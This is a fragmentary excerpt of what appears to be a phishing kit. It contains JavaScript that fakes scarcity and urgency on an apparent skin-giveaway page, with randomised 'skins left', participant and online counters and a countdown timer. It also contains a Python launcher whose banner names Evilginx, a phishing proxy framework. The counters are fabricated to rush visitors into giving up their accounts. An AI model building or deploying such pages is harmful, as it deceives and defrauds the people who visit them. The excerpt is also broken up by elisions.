...
setInterval(function(){
    if(skins>0){ skins-=Math.floor(Math.random()*2)+1; document.getElementById('skinsLeft').innerHTML=Math.max(0,skins); }
    parts+=Math.floor(Math.random()*3)+1; document.getElementById('participants').innerHTML=parts.toLocaleString();
    online+=Math.floor(Math.random()*5)-2; online=Math.min(300,Math.max(25,online)); document.getElementById('onlineCount').innerHTML=online;
    if(timerSec>0){ timerSec--; var m=Math.floor(timerSec/60), s=timerSec%60; document.getElementById('timer').innerHTML=(m<10?'0'+m:m)+':'+(s<10?'0'+s:s); }
},3000);
...
def run():
    print("="*60)
    print("🎯 EVILGINX FINAL - SEM F-STRING")
    print(f"📡 {PUBLIC_URL}")
    print("="*60)
